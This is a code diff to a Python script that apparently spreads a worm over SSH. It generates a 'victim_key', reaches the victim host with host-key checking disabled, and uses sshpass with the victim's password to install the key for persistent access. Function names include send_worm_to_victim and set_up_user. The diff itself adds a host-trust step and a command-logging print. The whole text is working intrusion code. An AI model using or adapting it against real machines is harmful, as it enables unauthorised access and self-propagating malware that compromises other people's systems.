@@ -9,6 +9,10 @@ def set_up_ssh_key():
     command = 'ssh-keygen -f ~/.ssh/victim_key -q -N \"\"'
     os.system(command)
 
+    # Know the host of victim
+    command = 'ssh -t {0}@{1} -p {2} -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o StrictHostKeyChecking=no \"test\"'.format(victim['name'], victim['ip'], victim['port'])
+    os.system(command)
+
     # Send public key to the victim
     command = 'sshpass -p {0} scp -P {1} ~/.ssh/victim_key.pub {2}@{3}:~/.ssh/'.format(victim['password'],
                                                                                        str(victim['port']),
@@ -37,8 +41,9 @@ def send_worm_to_victim():
 
 
 def send_ssh_command(command, isNeedPw=True):
+    print('[Send SSH Command] ' + command)
     sshCommand = 'sshpass -p {0} '.format(victim['password']) if isNeedPw else ''
-    sshCommand += 'ssh -t {0}@{1} -p {2} -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  \"{3}\"'.format(victim['name'], victim['ip'], victim['port'], command)
+    sshCommand += 'ssh -t {0}@{1} -p {2} \"{3}\"'.format(victim['name'], victim['ip'], victim['port'], command)
 
 
 def set_up_user():
